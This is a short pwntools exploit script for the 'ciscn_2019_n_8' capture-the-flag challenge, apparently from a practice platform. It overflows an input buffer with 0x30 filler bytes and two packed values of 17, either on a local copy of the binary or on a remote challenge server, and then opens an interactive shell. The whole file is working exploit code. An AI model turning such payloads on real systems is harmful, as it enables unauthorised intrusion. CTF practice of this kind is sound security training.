import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./ciscn_2019_n_8')
		elf=ELF('./ciscn_2019_n_8')
		libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28977)
		elf=ELF('./ciscn_2019_n_8')
		#libc=ELF('./libc.so')



	pay='a'*0x30+p32(17)+p32(17)
	io.recv()
	io.sendline(pay)
	#io.recv()
	#gdb.attach(io)
	#pause()
	io.interactive()